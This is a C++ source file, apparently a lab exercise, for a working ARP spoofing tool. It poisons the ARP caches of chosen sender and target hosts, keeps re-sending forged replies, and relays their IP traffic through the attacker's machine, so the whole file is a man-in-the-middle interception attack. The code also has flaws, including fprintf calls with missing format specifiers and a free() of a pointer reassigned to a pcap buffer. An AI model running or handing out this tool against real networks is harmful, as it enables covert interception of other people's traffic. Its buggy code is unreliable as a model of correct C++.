//to 2019.08.05
#include "arp_spoofing.h"
void usage() {
    printf("syntax: arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...] \n");
    printf("sample: arp_spoof wlan0 192.168.25.3 192.168.25.4 192.168.10.1 192.168.10.2\n");
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc % 2) == 1) {
        usage();
        return -1;
    }
    u_int8_t i = 0;
    u_int8_t vectorSize = static_cast<u_int8_t>((argc - 2) / 2);
    vector<ST_arp_section> v;
    u_int32_t sender = 0;
    u_int32_t target = 0;
    char* dev = argv[1];

    struct ST_je_arp_header* arp_header = reinterpret_cast<ST_je_arp_header*>(malloc(sizeof(ST_je_arp_header)));
    struct ST_je_ip_header* ip_header = reinterpret_cast<ST_je_ip_header*>(malloc(sizeof(ST_je_ip_header)));
    struct libnet_ethernet_hdr* eth_header = reinterpret_cast<libnet_ethernet_hdr*>(malloc(sizeof(libnet_ethernet_hdr)));

    //readey ip & mac
    struct ifreq ifr;
    int s;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, dev);

    //get mac ip
    ioctl(s, SIOCGIFHWADDR, &ifr);
    u_char mac[6] = {0};
    for (i=0; i<6; i++)
        mac[i] = static_cast<u_char>(ifr.ifr_hwaddr.sa_data[i]);

    //get ip add
    ioctl(s, SIOCGIFADDR, &ifr);
    struct sockaddr_in* ipaddr = reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr);
    u_int32_t ip = ipaddr->sin_addr.s_addr;

    //ready pcap
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    //section create
    for (i = 1; i <= vectorSize; i++) {
        sender = htonl(splitIP(argv[i*2]));
        target = htonl(splitIP(argv[i*2+1]));
        makeArpPacketSection(&v ,mac, ip, sender, target);
    }
    //frist send arp pakcet
    for(i = 0 ; i < vectorSize; i++) {
        if (pcap_sendpacket(handle, reinterpret_cast<u_char*>(&v[i].sernder), sizeof (ST_je_arp_header)) != 0)
        {
            fprintf(stderr,"\nError sending the sender packet: \n", pcap_geterr(handle));
            return -1;
        } else {
            v[i].senderCrrentTime = time(nullptr);
        }
        if (pcap_sendpacket(handle, reinterpret_cast<u_char*>(&v[i].target), sizeof (ST_je_arp_header)) != 0)
        {
            fprintf(stderr,"\nError sending the target packet: \n", pcap_geterr(handle));
            return -1;
        } else {
            v[i].targetCrrentTime = time(nullptr);
        }
    }


    while (true) {
        //1. keep generate arp packet
        //2. if packet is not arrived from dest then it generate arp pakcet
        for (i = 0; i < v.size(); i++) {
            if((time(nullptr) - v[i].senderCrrentTime) >= 3) {
                v[i].senderCrrentTime= time(nullptr);
                if (pcap_sendpacket(handle, reinterpret_cast<u_char*>(&v[i].sernder), sizeof (ST_je_arp_header)) != 0) {
                    fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
                    return -1;
                }
                printf("%d(time) : attcker to sender \r\n",i+1);
            }
            if((time(nullptr) - v[i].targetCrrentTime) >= 3){
                v[i].targetCrrentTime= time(nullptr);
                if (pcap_sendpacket(handle, reinterpret_cast<u_char*>(&v[i].target), sizeof (ST_je_arp_header)) != 0)
                {
                    fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
                    return -1;
                }
                printf("%d(time) : attcker to target\r\n", i+1);
            }
        }

        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);

        if (res == 0) continue;
        if (res == -1 || res == -2) break;


        eth_header = reinterpret_cast<libnet_ethernet_hdr*>(const_cast<u_char*>(packet));
        //recive and send arp packet
        if (ntohs(eth_header->ether_type) == ETHERTYPE_ARP) {
            packetInsert(const_cast<u_char*>(packet), &arp_header);
            if (arp_header->arp_hdr.ar_op == ARPOP_REPLY) {
                for (i = 0; i < vectorSize; i++) {
                    if(arp_header->sender_ip_addr.s_addr == v[i].sernder.target_ip_addr.s_addr){
                        if(!v[i].sendercheck){
                            memcpy(v[i].sernder.eth_hdr.ether_dhost, arp_header->sender_mac, 6);
                            memcpy(v[i].sernder.target_mac, arp_header->sender_mac, 6);

                            v[i].sernder.arp_hdr.ar_op = htons(ARPOP_REPLY);
                            v[i].sernder.sender_ip_addr.s_addr = v[i].target.target_ip_addr.s_addr;
                            v[i].sendercheck = 1;
                            printf("%d : attcker to sender %d\r\n", i + 1, v[i].sendercheck);
                        }
                        if (pcap_sendpacket(handle, reinterpret_cast<u_char*>(&v[i].sernder), sizeof (ST_je_arp_header)) != 0) {
                            fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
                            return -1;
                        }
                    }
                    if(arp_header->sender_ip_addr.s_addr == v[i].target.target_ip_addr.s_addr){
                        if(!v[i].targetcehck){
                            memcpy(v[i].target.eth_hdr.ether_dhost, arp_header->sender_mac, 6);
                            memcpy(v[i].target.target_mac, arp_header->sender_mac, 6);

                            v[i].target.arp_hdr.ar_op = htons(ARPOP_REPLY);
                            v[i].target.sender_ip_addr.s_addr = v[i].sernder.target_ip_addr.s_addr;
                            v[i].targetcehck = 1;
                            printf("%d : attcker to target %d\r\n", i + 1, v[i].targetcehck);
                        }
                        if (pcap_sendpacket(handle, reinterpret_cast<u_char*>(&v[i].target), sizeof (ST_je_arp_header)) != 0)
                        {
                            fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
                            return -1;
                        }
                    }
                }
            //when broadcast of arp pacet come, it send spoofed arp pakcet
            } else if(arp_header->arp_hdr.ar_op == ARPOP_REQUEST){
                for (i = 0; i < vectorSize; i++) {
                    if(arp_header->sender_ip_addr.s_addr == v[i].sernder.target_ip_addr.s_addr){
                        if(arp_header->target_ip_addr.s_addr == v[i].sernder.sender_ip_addr.s_addr){
                            for(int z = 0; z < 3; z++){
                                if (pcap_sendpacket(handle, reinterpret_cast<u_char*>(&v[i].sernder), sizeof (ST_je_arp_header)) != 0)
                                {
                                    fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
                                    return -1;
                                }
                            }
                        }
                    }
                    if(arp_header->sender_ip_addr.s_addr == v[i].target.target_ip_addr.s_addr){
                        if(arp_header->target_ip_addr.s_addr == v[i].target.sender_ip_addr.s_addr){
                            for(int z = 0; z < 3; z++){
                                if (pcap_sendpacket(handle, reinterpret_cast<u_char*>(&v[i].target), sizeof (ST_je_arp_header)) != 0)
                                {
                                    fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
                                    return -1;
                                }
                            }
                        }
                    }
                }
            }
        } else {
            //pakcet relay function
            if(ntohs(eth_header->ether_type) == ETHERTYPE_IP) {
                packetInsert(const_cast<u_char*>(packet), &ip_header);
                if((ip_header->ip_hdr.ip_dst.s_addr != ip) && (ip_header->ip_hdr.ip_src.s_addr != ip)){
                    for (i = 0; i < vectorSize; i++) {
                        if (ip_header->ip_hdr.ip_dst.s_addr == v[i].sernder.target_ip_addr.s_addr) {
                            if(ip_header->ip_hdr.ip_src.s_addr == v[i].sernder.sender_ip_addr.s_addr){
                                if(v[i].sendercheck){
                                    printf("%d seder -> attakcer -> target\r\n", i + 1);
                                    memcpy(ip_header->eth_hdr.ether_dhost, v[i].sernder.eth_hdr.ether_dhost,6);
                                    memcpy(ip_header->eth_hdr.ether_shost, v[i].sernder.eth_hdr.ether_shost,6);
                                    if (pcap_sendpacket(handle, packet, header->len) != 0)
                                    {
                                        fprintf(stderr,"\nError sending the target packet: \n", pcap_geterr(handle));
                                        return -1;
                                    }
                                }
                            }
                        }
                        if (ip_header->ip_hdr.ip_dst.s_addr == v[i].target.target_ip_addr.s_addr) {
                            if(ip_header->ip_hdr.ip_src.s_addr == v[i].target.sender_ip_addr.s_addr){
                                if(v[i].targetcehck){
                                    printf("%d target -> attakcer -> sender\r\n", i + 1);
                                    memcpy(ip_header->eth_hdr.ether_dhost, v[i].target.eth_hdr.ether_dhost,6);
                                    memcpy(ip_header->eth_hdr.ether_shost, v[i].target.eth_hdr.ether_shost,6);
                                    if (pcap_sendpacket(handle, packet, header->len) != 0)
                                    {
                                        fprintf(stderr,"\nError sending the target packet: \n", pcap_geterr(handle));
                                        return -1;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    //malloc and handle free
    free(arp_header);
    free(ip_header);
    free(eth_header);

    pcap_close(handle);
    return 0;
}
